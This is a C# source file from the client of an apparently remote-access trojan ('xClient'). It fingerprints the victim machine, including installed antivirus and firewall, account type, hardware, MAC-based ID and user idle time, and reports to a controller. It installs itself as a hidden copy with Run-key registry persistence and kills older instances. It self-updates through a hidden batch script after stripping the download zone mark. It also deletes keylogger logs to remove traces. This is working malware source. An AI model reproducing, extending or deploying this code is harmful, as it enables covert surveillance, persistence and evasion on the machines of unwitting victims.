using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using Microsoft.Win32;
using xClient.Config;
using xClient.Core.Encryption;
using xClient.Core.Extensions;
using xClient.Core.Helper;
using xClient.Core.Networking;
using xClient.Core.Utilities;
using xClient.Enums;

namespace xClient.Core
{
    public static class SystemCore
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool DeleteFile(string name);

        [DllImport("user32.dll")]
        private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

        [StructLayout(LayoutKind.Sequential)]
        private struct LASTINPUTINFO
        {
            public static readonly int SizeOf = Marshal.SizeOf(typeof(LASTINPUTINFO));
            [MarshalAs(UnmanagedType.U4)]
            public UInt32 cbSize;
            [MarshalAs(UnmanagedType.U4)]
            public UInt32 dwTime;
        }

        public static UserStatus LastStatus { get; set; }
        public static bool Disconnect { get; set; } // when Disconnect is true, stop all running threads
        public static string OperatingSystem { get; set; }
        public static string MyPath { get; set; }
        public static string InstallPath { get; set; }
        public static string AccountType { get; set; }

        public static string GetOperatingSystem()
        {
            return string.Format("{0} {1} Bit", PlatformHelper.Name, PlatformHelper.Architecture);
        }

        public static string GetAccountType()
        {
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                if (identity != null)
                {
                    WindowsPrincipal principal = new WindowsPrincipal(identity);

                    if (principal.IsInRole(WindowsBuiltInRole.Administrator))
                        return "Admin";
                    if (principal.IsInRole(WindowsBuiltInRole.User))
                        return "User";
                    if (principal.IsInRole(WindowsBuiltInRole.Guest))
                        return "Guest";
                }
            }

            return "Unknown";
        }

        public static string GetId()
        {
            return SHA256.ComputeHash(GetMacAddress());
        }

        public static string GetCpu()
        {
            try
            {
                string cpuName = string.Empty;
                string query = "SELECT * FROM Win32_Processor";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("root\\CIMV2", query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        cpuName = mObject["Name"].ToString();
                    }
                }

                return (!string.IsNullOrEmpty(cpuName)) ? cpuName : "N/A";
            }
            catch
            {
            }

            return "Unknown";
        }

        public static int GetRam()
        {
            try
            {
                int installedRAM = 0;
                string query = "Select * From Win32_ComputerSystem";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        double bytes = (Convert.ToDouble(mObject["TotalPhysicalMemory"]));
                        installedRAM = (int) (bytes/1048576);
                    }
                }

                return installedRAM;
            }
            catch
            {
                return -1;
            }
        }

        public static string GetGpu()
        {
            try
            {
                string gpuName = string.Empty;
                string query = "SELECT * FROM Win32_DisplayConfiguration";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        gpuName = mObject["Description"].ToString();
                    }
                }

                return (!string.IsNullOrEmpty(gpuName)) ? gpuName : "N/A";
            }
            catch
            {
                return "Unknown";
            }
        }

        public static string GetAntivirus()
        {
            try
            {
                string antivirusName = string.Empty;
                // starting with Windows Vista we must use the root\SecurityCenter2 namespace
                string scope = (PlatformHelper.VistaOrHigher) ? "root\\SecurityCenter2" : "root\\SecurityCenter";
                string query = "SELECT * FROM AntivirusProduct";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        antivirusName = mObject["displayName"].ToString();
                    }
                }

                return (!string.IsNullOrEmpty(antivirusName)) ? antivirusName : "N/A";
            }
            catch
            {
                return "Unknown";
            }
        }

        public static string GetFirewall()
        {
            try
            {
                string firewallName = string.Empty;
                // starting with Windows Vista we must use the root\SecurityCenter2 namespace
                string scope = (PlatformHelper.VistaOrHigher) ? "root\\SecurityCenter2" : "root\\SecurityCenter";
                string query = "SELECT * FROM FirewallProduct";

                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query))
                {
                    foreach (ManagementObject mObject in searcher.Get())
                    {
                        firewallName = mObject["displayName"].ToString();
                    }
                }

                return (!string.IsNullOrEmpty(firewallName)) ? firewallName : "N/A";
            }
            catch
            {
                return "Unknown";
            }
        }

        public static string GetUptime()
        {
            int uptimeSec = Environment.TickCount/1000;
            TimeSpan result = TimeSpan.FromSeconds(uptimeSec);
            return string.Format("{0}d : {1}h : {2}m : {3}s", result.Days, result.Hours, result.Minutes, result.Seconds);
        }

        public static string GetUsername()
        {
            return Environment.UserName;
        }

        public static string GetPcName()
        {
            return Environment.MachineName;
        }

        public static string GetLanIp()
        {
            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 ||
                    ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet &&
                    ni.OperationalStatus == OperationalStatus.Up)
                {
                    foreach (UnicastIPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
                    {
                        if (ip.Address.AddressFamily != AddressFamily.InterNetwork ||
                            ip.AddressPreferredLifetime == UInt32.MaxValue) // exclude virtual network addresses
                            continue;

                        return ip.Address.ToString();
                    }
                }
            }

            return "-";
        }

        public static string GetMacAddress()
        {
            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 ||
                    ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet &&
                    ni.OperationalStatus == OperationalStatus.Up)
                {
                    bool foundCorrect = false;
                    foreach (UnicastIPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
                    {
                        if (ip.Address.AddressFamily != AddressFamily.InterNetwork ||
                            ip.AddressPreferredLifetime == UInt32.MaxValue) // exclude virtual network addresses
                            continue;

                        foundCorrect = (ip.Address.ToString() == GetLanIp());
                    }

                    if (foundCorrect)
                        return FormatHelper.FormatMacAddress(ni.GetPhysicalAddress().ToString());
                }
            }

            return "-";
        }

        public static bool CreateMutex(ref Mutex mutex)
        {
            bool createdNew;
            mutex = new Mutex(false, Settings.MUTEX, out createdNew);
            return createdNew;
        }

        public static void UserIdleThread()
        {
            while (!Disconnect)
            {
                Thread.Sleep(5000);
                if (IsUserIdle())
                {
                    if (LastStatus != UserStatus.Idle)
                    {
                        LastStatus = UserStatus.Idle;
                        new Packets.ClientPackets.SetUserStatus(LastStatus).Execute(Program.ConnectClient);
                    }
                }
                else
                {
                    if (LastStatus != UserStatus.Active)
                    {
                        LastStatus = UserStatus.Active;
                        new Packets.ClientPackets.SetUserStatus(LastStatus).Execute(Program.ConnectClient);
                    }
                }
            }
        }

        private static bool IsUserIdle()
        {
            uint idleTime = 0;
            LASTINPUTINFO lastInputInfo = new LASTINPUTINFO();
            lastInputInfo.cbSize = (uint) Marshal.SizeOf(lastInputInfo);
            lastInputInfo.dwTime = 0;

            uint envTicks = (uint) Environment.TickCount;

            if (GetLastInputInfo(ref lastInputInfo))
            {
                uint lastInputTick = lastInputInfo.dwTime;
                idleTime = envTicks - lastInputTick;
            }

            idleTime = ((idleTime > 0) ? (idleTime/1000) : 0);

            return (idleTime > 600); // idle for 10 minutes
        }

        public static void AddToStartup()
        {
            if (Settings.STARTUP)
            {
                if (AccountType == "Admin")
                {
                    try // try LocalMachine
                    {
                        using (
                            RegistryKey key =
                                Microsoft.Win32.Registry.LocalMachine.OpenWritableSubKeySafe("Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
                        {
                            if (key == null) throw new Exception();
                            key.SetValue(Settings.STARTUPKEY, InstallPath);
                            key.Close();
                        }
                    }
                    catch // if fails use CurrentUser
                    {
                        try
                        {
                            using (
                                RegistryKey key =
                                    Microsoft.Win32.Registry.CurrentUser.OpenWritableSubKeySafe(
                                        "Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
                            {
                                if (key == null) throw new Exception();
                                key.SetValue(Settings.STARTUPKEY, InstallPath);
                                key.Close();
                            }
                        }
                        catch
                        {
                        }
                    }
                }
                else
                {
                    try
                    {
                        using (
                            RegistryKey key =
                                Microsoft.Win32.Registry.CurrentUser.OpenWritableSubKeySafe("Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
                        {
                            if (key == null) throw new Exception();
                            key.SetValue(Settings.STARTUPKEY, InstallPath);
                            key.Close();
                        }
                    }
                    catch
                    {
                    }
                }
            }
        }

        public static void RemoveFromStartup()
        {
            if (Settings.STARTUP)
            {
                if (AccountType == "Admin")
                {
                    try
                    {
                        using (
                            RegistryKey key =
                                Microsoft.Win32.Registry.LocalMachine.OpenWritableSubKeySafe("Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
                        {
                            if (key != null)
                            {
                                key.DeleteValue(Settings.STARTUPKEY, false);
                                key.Close();
                            }
                        }
                    }
                    catch
                    {
                        // try deleting from Registry.CurrentUser
                        using (
                            RegistryKey key =
                                Microsoft.Win32.Registry.CurrentUser.OpenWritableSubKeySafe("Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
                        {
                            if (key != null)
                            {
                                key.DeleteValue(Settings.STARTUPKEY, false);
                                key.Close();
                            }
                        }
                    }
                }
                else
                {
                    try
                    {
                        using (
                            RegistryKey key =
                                Microsoft.Win32.Registry.CurrentUser.OpenWritableSubKeySafe("Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
                        {
                            if (key != null)
                            {
                                key.DeleteValue(Settings.STARTUPKEY, false);
                                key.Close();
                            }
                        }
                    }
                    catch
                    {
                    }
                }
            }
        }

        public static void Install(bool addToStartup = true)
        {
            bool isKilled = false;

            // create target dir
            if (!Directory.Exists(Path.Combine(Settings.DIR, Settings.SUBFOLDER)))
                Directory.CreateDirectory(Path.Combine(Settings.DIR, Settings.SUBFOLDER));

            // delete existing file
            if (File.Exists(InstallPath))
            {
                try
                {
                    File.Delete(InstallPath);
                }
                catch (Exception ex)
                {
                    if (ex is IOException || ex is UnauthorizedAccessException)
                    {
                        // kill old process if new mutex
                        Process[] foundProcesses =
                            Process.GetProcessesByName(Path.GetFileNameWithoutExtension(InstallPath));
                        int myPid = Process.GetCurrentProcess().Id;
                        foreach (var prc in foundProcesses)
                        {
                            if (prc.Id == myPid) continue;
                            prc.Kill();
                            isKilled = true;
                        }
                    }
                }
            }

            if (isKilled) Thread.Sleep(5000);

            //copy client to target dir
            File.Copy(MyPath, InstallPath, true);

            if (addToStartup)
                AddToStartup();

            if (Settings.HIDEFILE)
            {
                try
                {
                    File.SetAttributes(InstallPath, FileAttributes.Hidden);
                }
                catch
                {
                }
            }

            //start file
            var startInfo = new ProcessStartInfo
            {
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = true,
                FileName = InstallPath
            };
            Process.Start(startInfo);

            Disconnect = true;
        }

        public static void UpdateClient(Client c, string newFile)
        {
            try
            {
                DeleteFile(newFile + ":Zone.Identifier");

                var bytes = File.ReadAllBytes(newFile);
                if (bytes[0] != 'M' && bytes[1] != 'Z')
                    throw new Exception("no pe file");

                string filename = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    FileHelper.GetRandomFilename(12, ".bat"));

                string uninstallBatch = (Settings.INSTALL && Settings.HIDEFILE)
                    ? "@echo off" + "\n" +
                      "echo DONT CLOSE THIS WINDOW!" + "\n" +
                      "ping -n 20 localhost > nul" + "\n" +
                      "del /A:H " + "\"" + MyPath + "\"" + "\n" +
                      "move " + "\"" + newFile + "\"" + " " + "\"" + MyPath + "\"" + "\n" +
                      "start \"\" " + "\"" + MyPath + "\"" + "\n" +
                      "del " + "\"" + filename + "\""
                    : "@echo off" + "\n" +
                      "echo DONT CLOSE THIS WINDOW!" + "\n" +
                      "ping -n 20 localhost > nul" + "\n" +
                      "del " + "\"" + MyPath + "\"" + "\n" +
                      "move " + "\"" + newFile + "\"" + " " + "\"" + MyPath + "\"" + "\n" +
                      "start \"\" " + "\"" + MyPath + "\"" + "\n" +
                      "del " + "\"" + filename + "\""
                    ;

                File.WriteAllText(filename, uninstallBatch);
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = true,
                    FileName = filename
                };
                Process.Start(startInfo);

                Disconnect = true;
                c.Disconnect();
                RemoveTraces();
            }
            catch (Exception ex)
            {
                DeleteFile(newFile);
                new Packets.ClientPackets.SetStatus(string.Format("Update failed: {0}", ex.Message)).Execute(c);
            }
        }

        public static void RemoveTraces()
        {
            RemoveFromStartup();

            if (Directory.Exists(Keylogger.LogDirectory)) // try to delete Logs from Keylogger
            {
                try
                {
                    Directory.Delete(Keylogger.LogDirectory, true);
                }
                catch
                {
                }
            }
        }
    }
}